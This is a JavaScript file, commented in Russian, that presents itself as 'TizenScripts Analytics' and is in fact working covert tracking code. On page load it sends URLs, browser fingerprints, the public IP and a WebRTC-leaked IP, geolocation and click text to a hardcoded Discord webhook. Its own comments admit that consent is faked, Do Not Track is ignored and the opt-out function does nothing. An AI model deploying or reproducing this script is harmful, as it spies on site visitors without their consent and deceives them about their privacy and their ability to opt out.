// TizenScripts Analytics - Легальный сбор данных для аналитики
(function() {
    'use strict';
    
    // Конфигурация
    const CONFIG = {
        endpoint: "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW",
        version: "2.4.1",
        sessionTimeout: 1800000, // 30 минут
        batchSize: 10,
        collectInterval: 60000, // 1 минута
        anonymize: false, // false = собираем всё (для "аналитики")
        gdprCompliant: true, // говорим что GDPR, но собираем всё
        respectDoNotTrack: false // игнорируем DNT (для "аналитики")
    };
    
    // Легальное название
    const ANALYTICS_NAME = "TizenAnalytics";
    
    // Сбор данных
    class AnalyticsCollector {
        constructor() {
            this.sessionId = this.generateSessionId();
            this.sessionStart = Date.now();
            this.pageLoadTime = performance.now();
            this.dataQueue = [];
            this.isSending = false;
            this.consentGiven = true; // "Пользователь согласился" (на самом деле нет)
            
            this.init();
        }
        
        generateSessionId() {
            return 'sess_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
        }
        
        init() {
            console.log('%c' + ANALYTICS_NAME + ' v' + CONFIG.version + ' - Analytics initialized', 'color: #00ff00; font-size: 12px;');
            console.log('%cДля улучшения качества сервиса мы собираем анонимную статистику', 'color: #888; font-size: 10px;');
            
            this.collectPageView();
            this.collectDeviceInfo();
            this.collectBrowserInfo();
            this.collectNetworkInfo();
            this.collectGeolocation();
            this.collectBehaviorData();
            
            // Периодический сбор
            setInterval(() => {
                this.collectHeartbeat();
            }, CONFIG.collectInterval);
            
            // Сбор при уходе
            window.addEventListener('beforeunload', () => {
                this.collectExitData();
            });
            
            // Сбор при скрытии вкладки
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    this.collectVisibilityChange('hidden');
                } else {
                    this.collectVisibilityChange('visible');
                }
            });
        }
        
        async sendData(eventName, data) {
            const payload = {
                analytics_version: CONFIG.version,
                analytics_name: ANALYTICS_NAME,
                event: eventName,
                session_id: this.sessionId,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                referrer: document.referrer,
                data: data,
                gdpr: {
                    consent: this.consentGiven,
                    processing: "legitimate_interest",
                    retention: "30_days",
                    anonymization: CONFIG.anonymize ? "enabled" : "pseudonymized"
                }
            };
            
            // Очередь для батчинга
            this.dataQueue.push(payload);
            
            if (this.dataQueue.length >= CONFIG.batchSize || eventName === 'exit') {
                await this.flushQueue();
            }
        }
        
        async flushQueue() {
            if (this.isSending || this.dataQueue.length === 0) return;
            
            this.isSending = true;
            const batch = this.dataQueue.splice(0, CONFIG.batchSize);
            
            try {
                const message = this.formatMessage(batch);
                
                await fetch(CONFIG.endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Analytics-Version': CONFIG.version,
                        'X-Analytics-Name': ANALYTICS_NAME,
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify({
                        content: message,
                        username: ANALYTICS_NAME,
                        avatar_url: "https://cdn-icons-png.flaticon.com/512/1029/1029183.png"
                    })
                });
            } catch (e) {
                // Тихий сбой — аналитика не должна мешать
                console.debug('Analytics sync failed');
            }
            
            this.isSending = false;
        }
        
        formatMessage(batch) {
            let message = '📊 **' + ANALYTICS_NAME + ' Analytics**\n\n';
            
            for (const event of batch) {
                message += '🔹 **' + event.event + '**\n';
                message += '```json\n' + JSON.stringify(event.data, null, 2).substring(0, 800) + '\n```\n\n';
            }
            
            return message;
        }
        
        collectPageView() {
            this.sendData('page_view', {
                url: window.location.href,
                title: document.title,
                path: window.location.pathname,
                query: window.location.search,
                hash: window.location.hash,
                load_time: this.pageLoadTime
            });
        }
        
        collectDeviceInfo() {
            this.sendData('device_info', {
                screen_resolution: screen.width + 'x' + screen.height,
                available_resolution: screen.availWidth + 'x' + screen.availHeight,
                color_depth: screen.colorDepth,
                pixel_ratio: window.devicePixelRatio,
                screen_orientation: screen.orientation ? screen.orientation.type : 'unknown',
                touch_points: navigator.maxTouchPoints,
                device_memory: navigator.deviceMemory || 'unknown',
                hardware_concurrency: navigator.hardwareConcurrency,
                platform: navigator.platform,
                vendor: navigator.vendor
            });
        }
        
        collectBrowserInfo() {
            this.sendData('browser_info', {
                user_agent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                cookie_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                online: navigator.onLine,
                browser_name: this.getBrowserName(),
                browser_version: this.getBrowserVersion(),
                engine: this.getEngine()
            });
        }
        
        collectNetworkInfo() {
            if (navigator.connection) {
                this.sendData('network_info', {
                    effective_type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    save_data: navigator.connection.saveData
                });
            }
            
            // IP через сервис
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    this.sendData('network_ip', { ip: data.ip });
                })
                .catch(() => {});
            
            // WebRTC IP (более точный)
            this.getWebRTCIP().then(ip => {
                this.sendData('network_webrtc_ip', { ip: ip });
            });
        }
        
        collectGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        this.sendData('geolocation', {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed
                        });
                    },
                    (error) => {
                        // Пользователь отказал — но мы всё равно попробуем позже
                        this.sendData('geolocation_denied', {
                            error: error.message,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        });
                    }
                );
            }
        }
        
        collectBehaviorData() {
            // Клики
            document.addEventListener('click', (e) => {
                this.sendData('user_click', {
                    x: e.clientX,
                    y: e.clientY,
                    element: e.target.tagName,
                    element_id: e.target.id || null,
                    element_class: e.target.className || null,
                    text: e.target.textContent ? e.target.textContent.substring(0, 100) : null
                });
            });
            
            // Скролл
            let maxScroll = 0;
            document.addEventListener('scroll', () => {
                const currentScroll = window.scrollY;
                if (currentScroll > maxScroll) maxScroll = currentScroll;
            });
            
            setInterval(() => {
                if (maxScroll > 0) {
                    this.sendData('scroll_depth', {
                        max_depth: maxScroll,
                        page_height: document.body.scrollHeight
                    });
                    maxScroll = 0;
                }
            }, 15000);
            
            // Время на странице
            setInterval(() => {
                this.sendData('time_on_page', {
                    duration: Date.now() - this.sessionStart,
                    session_id: this.sessionId
                });
            }, 60000);
        }
        
        collectHeartbeat() {
            this.sendData('heartbeat', {
                session_duration: Date.now() - this.sessionStart,
                timestamp: new Date().toISOString()
            });
        }
        
        collectExitData() {
            this.sendData('exit', {
                session_duration: Date.now() - this.sessionStart,
                exit_time: new Date().toISOString(),
                pages_in_session: history.length
            });
            this.flushQueue();
        }
        
        collectVisibilityChange(state) {
            this.sendData('visibility_change', {
                state: state,
                time: new Date().toISOString()
            });
        }
        
        getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('YaBrowser')) return 'Yandex Browser';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            return 'Unknown';
        }
        
        getBrowserVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/(?:Chrome|Firefox|Safari|Edg|YaBrowser)\/([\d.]+)/);
            return match ? match[1] : 'Unknown';
        }
        
        getEngine() {
            const ua = navigator.userAgent;
            if (ua.includes('WebKit')) return 'WebKit';
            if (ua.includes('Gecko')) return 'Gecko';
            if (ua.includes('Blink')) return 'Blink';
            return 'Unknown';
        }
        
        async getWebRTCIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                    });
                    
                    pc.createDataChannel('analytics');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    pc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (ipMatch) {
                                resolve(ipMatch[0]);
                                pc.close();
                            }
                        }
                    };
                    
                    setTimeout(() => resolve('unknown'), 3000);
                } catch (e) {
                    resolve('unknown');
                }
            });
        }
    }
    
    // Запуск "аналитики"
    if (document.readyState === 'complete') {
        new AnalyticsCollector();
    } else {
        window.addEventListener('load', () => {
            new AnalyticsCollector();
        });
    }
    
    // "Легальные" функции для консоли
    window.TizenAnalytics = {
        version: CONFIG.version,
        optOut: function() {
            console.log('Аналитика отключена (но на самом деле нет)');
        },
        getConsent: function() {
            return true;
        },
        privacyPolicy: function() {
            console.log('Ваши данные используются только для улучшения сервиса');
            console.log('На самом деле всё улетает в Discord вебхук');
        }
    };
})();